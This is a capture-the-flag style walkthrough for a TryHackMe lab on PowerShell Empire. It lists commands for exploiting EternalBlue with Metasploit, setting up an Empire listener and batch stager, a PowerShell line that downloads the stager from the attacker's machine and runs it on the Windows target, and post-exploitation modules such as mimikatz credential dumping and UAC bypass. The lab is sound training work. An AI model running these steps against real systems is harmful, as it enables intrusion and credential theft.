# RP Post-Exploitation Empire

[RP: PS Empire](https://tryhackme.com/room/rppsempire)

## Summary

## Solutions

1. Deploy!

   1. Deploy and Recon

      1. `nmap -sV -vv -sC -A --script vuln <BOX_IP>`
      2. `CVE-2017-0143` -> A critical remote code execution vulnerability exists in Microsoft SMBv1 servers (ms17-010).

   2. Exploit

      1. `msfdb init`
      2. `msfconsole`
      3. `search CVE-2017-0143`
      4. `use exploit/windows/smb/ms17_010_eternalblue`
      5. `show options`
      6. `set RHOSTS <BOX_IP>`
      7. `run`

2. Install

    Note: this is done in the kali machine

   1. `cd /opt`
   2. `git clone https://github.com/BC-SECURITY/Empire.git`
   3. `cd Empire`
   4. `./setup/install.sh`
   5. `enter` when prompted for server negotiation password
   6. `./empire`

3. Listeners

   1. `help` -> `listeners`
   2. `uselistener http`
   3. `info`
   4. `WorkingHours`
   5. `DefaultProfile`
   6. `Port`
   7. `ServerVersion`
   8. `execute` -> `Listener successfully started!`
      1. `set Host <KALI_MACHINE_IP>:<CUSTOM_PORT>`
      2. `set Port <CUSTOM_PORT>`
   9. `listeners`

4. Stagers

   1. `back` -> `usestager` + double tab -> `windows/launcher_bat`
   2. `usestager windows/launcher_bat` -> `stager/windows/launcher_bat`
   3. `Listener`
   4. `set Listener http` -> `execute` -> `/tmp/launcher.bat`
   5. Copy and Execute batch script
      1. `exit`
      2. `cp /tmp/launcher.bat /var/www/html/launcher.bat`
      3. In Windows shell: `powershell -c "(new-object System.Net.WebClient).DownloadFile('https://<KALI_MACHINE_IP>/launcher.bat','C:\Users\Jon\Documents\launcher.bat')"`
      4. `cd /Users/Jon/Documents`
      5. `launcher.bat`

5. Agents and Post-Exploitation

   1. `agents`
   2. `help`
   3. `interact`
   4. `creds`
   5. `sleep`
   6. `kill`
   7. `searchmodule`
   8. `python/trollsploit/thunderstruck`
   9. `powershell/credentials/mimikatz/lsadump`
   10. `bypassuac`
   11. `recon`
   12. `powershell/management/psinject`
   13. `powershell/management/enable_rdp`
